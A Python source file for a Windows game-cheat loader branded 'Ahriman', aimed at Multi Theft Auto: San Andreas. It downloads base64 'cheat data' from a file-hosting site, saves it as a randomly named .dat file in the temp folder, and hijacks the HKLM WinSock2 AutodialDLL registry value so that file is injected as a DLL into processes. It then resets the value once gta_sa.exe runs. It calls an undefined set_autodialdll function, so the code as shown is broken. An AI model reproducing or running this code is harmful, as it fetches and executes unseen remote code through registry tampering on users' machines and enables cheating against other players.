import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import requests
import time
import tempfile
from colorama import init, Fore, Style
init()
import win32crypt
import random
import string
import winreg
import subprocess
import ctypes
import psutil
from Crypto.Cipher import AES

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        try:
            script = sys.executable
            params = ' '.join([script] + sys.argv)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", script, params, None, 1)
        except Exception as e:
            print(f"[ERROR] Failed to elevate: {e}")
        sys.exit(0)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
temp_folder = tempfile.gettempdir()


def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"
        
def banner():
    os.system("cls")
    print(Fore.RED + """
    ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
    ⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
    ⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
    ⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
    ⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
    ⠀⠀⠀⠘⢿⣿⣟⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣾⣿⣿⠏⠀
    ⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀⠀
    ⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸⠀⠀
    ⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼          ▄▀█ █ █ █▀█ █ █▀▄▀█ ▄▀█ █▄ █
    ⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃          █▀█ █▀█ █▀▄ █ █ ▀ █ █▀█ █ ▀█
    ⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀⠀⠀⠀
    ⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀                  discord.gg/owwl
    ⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀
    """)

def random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".dat"
    
def random_foldername():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))


# def save_aes_file(data, output_path, key):
#     try:
#         encrypted_bytes = base64.b64decode(data)
#         cipher = AES.new(key, AES.MODE_ECB)
#         file_bytes = cipher.decrypt(encrypted_bytes)
#         with open(output_path, "wb") as f:
#             f.write(file_bytes)
#         return True
#     except Exception:
#         return False

def save_base64_file(b64_data, output_path):
    try:
        file_bytes = base64.b64decode(b64_data)
        with open(output_path, "wb") as f:
            f.write(file_bytes)
        return True
    except Exception:
        return False

def get_mta_path():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6")
        value, _ = winreg.QueryValueEx(key, "Last Run Path")
        winreg.CloseKey(key)
        return value
    except FileNotFoundError:
        return None

        
def chekUpdated():
    url = "https://rozup.ir/download/4098065/ahrimanv1.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15, allow_redirects=True)
        if response.status_code == 200:
            return response.text.strip() == "ok"
        return False
    except requests.RequestException:
        return False
        
def getCheatData():
    url = "https://rozup.ir/download/4098066/cheatdata.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
    }
    try:
        response = requests.get(url, headers=headers, timeout=15, allow_redirects=True)
        if response.status_code == 200:
            return response.text
        return None
    except requests.RequestException:
        return None



def wait_and_set_autodialdll(target_process="gta_sa.exe", dll_path=r"C:\Windows\System32\rasadhlp.dll"):
    while True:
        running = any(p.name().lower() == target_process.lower() for p in psutil.process_iter())
        if running:
            break
        time.sleep(0.5)

    time.sleep(4)

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\WinSock2\Parameters", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AutodialDLL", 0, winreg.REG_SZ, dll_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    banner()
    # rand_file = os.path.join(LOCAL + random_foldername(), random_filename())
    # rand_file = os.path.join(ROAMING + "\\asdasd\\", random_filename())
    rand_file = os.path.join(temp_folder, random_filename())

    print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Checking updates...")
    if not chekUpdated():
        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Update Failed ! Download new version : discord.gg/owwl")
        time.sleep(3)
        sys.exit(0)
    else:
        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Loader is up to date")
        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Fetching Cheat data...")
        data = getCheatData()
        if data:
            if save_base64_file(data, rand_file):
                mta_path = get_mta_path()
                if mta_path:
                    if set_autodialdll(rand_file):
                        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Opening MTA:SA...")
                        subprocess.Popen(mta_path)
                        wait_and_set_autodialdll()
                        sys.exit(0)
                    else:
                        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #4")
                        time.sleep(3)
                        sys.exit(0)
                else:
                    print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #3")
                    time.sleep(3)
                    sys.exit(0)
            else:
                print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #1")
                time.sleep(3)
                sys.exit(0)
        else:
            print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #2")
            time.sleep(3)
            sys.exit(0)